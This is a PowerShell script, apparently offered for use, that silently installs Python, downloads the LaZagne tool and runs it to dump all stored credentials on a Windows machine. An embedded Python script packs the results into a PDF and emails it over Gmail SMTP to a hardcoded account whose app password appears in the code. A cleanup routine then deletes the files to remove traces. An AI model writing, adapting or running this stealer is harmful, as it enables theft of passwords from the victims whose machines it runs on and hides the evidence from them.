# PowerShell version of LaZagne script for Windows 11
Write-Host "Starting Windows LaZagne operation..."
Write-Host "This may take several minutes. Please wait..."

# Environmental variables
$TEMP = $env:TEMP
$LAZAGNE_EXE = Join-Path $TEMP "LaZagne.exe"
$LAZAGNE_DIR = Join-Path $TEMP "LaZagne"
$RESULTS_FILE = Join-Path $TEMP "lazagne_results.txt"
$PDF_FILE = Join-Path $TEMP "lazagne_results.pdf"
$PYTHON_SCRIPT = Join-Path $TEMP "lazagne_email.py"
$LOG_DIR = Join-Path $TEMP "logs"

# Create log directory
New-Item -ItemType Directory -Path $LOG_DIR -Force | Out-Null

function Install-Python {
    Write-Host "Checking for Python..."
    
    # Check if Python is already installed
    try {
        $pythonVersion = python --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Python is already installed."
            return $true
        }
    }
    catch {
        # Python not in PATH, continue with installation
    }
    
    Write-Host "Installing Python..."
    
    # Download Python installer
    $pythonInstaller = Join-Path $TEMP "python_installer.exe"
    try {
        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" -OutFile $pythonInstaller -ErrorAction Stop
    }
    catch {
        Write-Host "Failed to download Python installer: $($_.Exception.Message)"
        return $false
    }
    
    # Install Python silently
    try {
        $process = Start-Process -FilePath $pythonInstaller -ArgumentList "/quiet", "InstallAllUsers=1", "PrependPath=1", "Include_test=0" -Wait -PassThru
        if ($process.ExitCode -ne 0) {
            throw "Installation failed with exit code $($process.ExitCode)"
        }
    }
    catch {
        Write-Host "Python installation failed: $($_.Exception.Message)"
        Remove-Item $pythonInstaller -Force -ErrorAction SilentlyContinue
        return $false
    }
    
    # Clean up installer
    Remove-Item $pythonInstaller -Force -ErrorAction SilentlyContinue
    
    # Refresh PATH
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path", "User")
    
    # Verify installation
    try {
        python --version | Out-Null
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Python installed successfully."
            return $true
        }
    }
    catch {
        Write-Host "Python installation verification failed."
        return $false
    }
    
    return $false
}

function Install-Packages {
    Write-Host "Installing required Python packages..."
    
    try {
        # Upgrade pip
        python -m pip install --upgrade pip --quiet 2>$null
        
        # Install required packages
        python -m pip install --quiet reportlab fpdf 2>$null
        
        # Verify packages
        python -c "import reportlab, fpdf" 2>$null
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Packages installed successfully."
            return $true
        }
        else {
            Write-Host "Failed to verify package installation."
            return $false
        }
    }
    catch {
        Write-Host "Package installation failed: $($_.Exception.Message)"
        return $false
    }
}

function Download-LaZagne {
    Write-Host "Downloading LaZagne..."
    
    try {
        Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe" -OutFile $LAZAGNE_EXE -ErrorAction Stop
        
        if (Test-Path $LAZAGNE_EXE) {
            Write-Host "LaZagne downloaded successfully."
            return $true
        }
        else {
            Write-Host "LaZagne download failed - file not found."
            return $false
        }
    }
    catch {
        Write-Host "Failed to download LaZagne: $($_.Exception.Message)"
        return $false
    }
}

function Create-PythonScript {
    $scriptContent = @"
import smtplib, ssl, socket, os, getpass, time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

# Set environmental variables
RESULTS_FILE = r"$RESULTS_FILE"
PDF_FILE = r"$PDF_FILE"

# Try to import reportlab with fallback
try:
    from reportlab.lib.pagesizes import letter
    from reportlab.pdfgen import canvas
    reportlab_available = True
except ImportError:
    reportlab_available = False

try:
    import fpdf
    fpdf_available = True
except ImportError:
    fpdf_available = False

def send_email(subject, body, attachment_path=None):
    try:
        gmail_user = "github0987@gmail.com"
        gmail_app_password = "gwhl efna quvk qhqj"
        
        msg = MIMEMultipart()
        msg["From"] = gmail_user
        msg["To"] = gmail_user
        msg["Subject"] = subject
        msg["X-Priority"] = "1"
        
        msg.attach(MIMEText(body, "plain"))
        
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, "rb") as f:
                part = MIMEApplication(f.read(), Name=os.path.basename(attachment_path))
            part["Content-Disposition"] = f"attachment; filename=\"{os.path.basename(attachment_path)}\""
            msg.attach(part)
        
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(gmail_user, gmail_app_password)
            server.sendmail(gmail_user, gmail_user, msg.as_string())
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False

def create_pdf(content, filename):
    if reportlab_available:
        try:
            c = canvas.Canvas(filename, pagesize=letter)
            text = c.beginText(40, 750)
            text.setFont("Helvetica", 10)
            
            lines = []
            for line in content.split("\n"):
                while len(line) > 100:
                    lines.append(line[:100])
                    line = line[100:]
                lines.append(line)
            
            for line in lines:
                if text.getY() < 40:
                    c.drawText(text)
                    c.showPage()
                    text = c.beginText(40, 750)
                    text.setFont("Helvetica", 10)
                text.textLine(line)
            
            c.drawText(text)
            c.save()
            return True
        except Exception as e:
            pass
    
    if fpdf_available:
        try:
            pdf = fpdf.FPDF()
            pdf.add_page()
            pdf.set_font("Arial", size=10)
            
            for line in content.split("\n"):
                pdf.cell(0, 5, line[:90], ln=True)
            
            pdf.output(filename)
            return True
        except Exception as e:
            pass
    
    try:
        with open(filename.replace(".pdf", ".txt"), "w") as f:
            f.write(content)
        return False
    except:
        return False

# Get system info
username = getpass.getuser()
hostname = socket.gethostname()
system_os = "Windows"

# Read results file
lazagne_output = ""
try:
    with open(RESULTS_FILE, "r", encoding="utf-8", errors="ignore") as f:
        lazagne_output = f.read()
except:
    lazagne_output = "Failed to read results file"

# Create PDF with results
pdf_created = create_pdf(lazagne_output, PDF_FILE)

# Send LaZagne results via email with PDF attachment
results_subject = "LaZagne Results from " + hostname
time_str = time.strftime("%Y-%m-%d %H:%M:%S")
results_body = "System: " + hostname + " (" + system_os + ")\nUser: " + username + "\nTime: " + time_str

if pdf_created:
    send_email(results_subject, results_body, PDF_FILE)
else:
    results_body += "\n\nLaZagne Output:\n" + lazagne_output[:1500]
    send_email(results_subject, results_body)

# Final success notification
time_str = time.strftime("%Y-%m-%d %H:%M:%S")
send_email("All Operations Completed", "Complete operation successful on " + hostname + ". System: " + system_os + ", User: " + username + ", Time: " + time_str)

print("All operations completed successfully. Check your email for details.")
"@

    try {
        Set-Content -Path $PYTHON_SCRIPT -Value $scriptContent -Encoding UTF8
        return $true
    }
    catch {
        Write-Host "Failed to create Python script: $($_.Exception.Message)"
        return $false
    }
}

function Cleanup {
    Write-Host "Starting cleanup process..."
    
    # Remove files
    $filesToRemove = @(
        $LAZAGNE_EXE,
        $RESULTS_FILE,
        $PDF_FILE,
        $PYTHON_SCRIPT,
        (Join-Path $TEMP "LaZagne*"),
        (Join-Path $TEMP "lazagne_*"),
        (Join-Path $TEMP "reportlab*"),
        (Join-Path $TEMP "fpdf*")
    )
    
    foreach ($file in $filesToRemove) {
        try {
            Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
        }
        catch {}
    }
    
    # Remove directories
    $dirsToRemove = @(
        $LAZAGNE_DIR,
        $LOG_DIR
    )
    
    foreach ($dir in $dirsToRemove) {
        try {
            Remove-Item -Path $dir -Recurse -Force -ErrorAction SilentlyContinue
        }
        catch {}
    }
    
    # Clear Python cache
    try {
        Get-ChildItem -Path $TEMP -Recurse -Include "*.pyc", "*.pyo" | Remove-Item -Force -ErrorAction SilentlyContinue
        Get-ChildItem -Path $TEMP -Recurse -Directory -Include "__pycache__" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    }
    catch {}
    
    Write-Host "Cleanup completed. All traces removed."
}

# Main execution flow
try {
    # Install Python if needed
    if (-not (Install-Python)) {
        Write-Host "Python installation failed."
        Cleanup
        exit 1
    }
    
    # Install packages
    if (-not (Install-Packages)) {
        Write-Host "Package installation failed."
        Cleanup
        exit 1
    }
    
    # Download LaZagne
    if (-not (Download-LaZagne)) {
        Write-Host "LaZagne download failed."
        Cleanup
        exit 1
    }
    
    # Create Python email script
    if (-not (Create-PythonScript)) {
        Write-Host "Failed to create Python script."
        Cleanup
        exit 1
    }
    
    # Run LaZagne and capture results
    Write-Host "Running LaZagne to retrieve stored credentials..."
    New-Item -ItemType Directory -Path $LAZAGNE_DIR -Force | Out-Null
    Set-Location $LAZAGNE_DIR
    
    & $LAZAGNE_EXE all 2>&1 | Out-File -FilePath $RESULTS_FILE -Encoding UTF8
    
    # Send results via email
    Write-Host "Sending results via email..."
    python $PYTHON_SCRIPT
    
    # Final cleanup
    Cleanup
    
    Write-Host "Operation completed successfully. All temporary files cleaned up."
    Write-Host "Press any key to continue..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
catch {
    Write-Host "An error occurred: $($_.Exception.Message)"
    Cleanup
    exit 1
}
